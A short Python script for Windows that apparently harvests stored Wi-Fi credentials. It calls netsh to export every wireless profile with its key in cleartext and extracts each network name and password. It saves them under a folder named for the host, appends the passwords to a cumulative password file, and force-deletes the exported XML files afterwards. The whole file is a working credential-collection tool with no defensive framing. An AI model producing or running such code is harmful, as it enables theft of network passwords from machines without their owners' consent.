import os
import datetime
import socket

way = os.getcwd()   # current dir

p_folder = "pList"  # folder contains passwords base
u_folder = "uList"  # folder contains user folders

d = datetime.datetime.now() #get time and date
date = str(d.day) + '_' + str(d.month) + '_' + str(d.year) + '_' + str(d.hour) + '_' + str(d.minute) + '_' + str(d.second)
folder_name = str(socket.gethostname() + '_' + date)
full_way = os.path.join(way, u_folder, folder_name)

os.mkdir(full_way)  # create folder
os.system('netsh wlan export profile folder={}\\{} key=clear'.format(u_folder, folder_name))  # cmd command

file_base_way = os.path.join(way, p_folder) 
f_base = open(file_base_way + "\\p_b.txt", 'a')

files = os.listdir(full_way)
print(files)

for file in files:
    file_path = os.path.join(full_way, file)
    f_out = open(file_path, 'r')

    for line in f_out:
        if "<name>" in line: 
            name = line
        if "<keyMaterial>" in line:
            password = line

    name = name[name.find('>')+1 : name.find('</')]
    password = password[password.find('>')+1 : password.find('</')]
    f_out.close()

    f_in = open(os.path.join(full_way, folder_name + '_base.txt'),'a')

    f_in.write("---------------------\nNAME:\t  " + name + '\nPASSWORD: ' + password + '\n')
    f_in.close()

    f_base.write(password + '\n')


os.system("del /Q /F {}\\*.xml".format(full_way))

f_base.close()
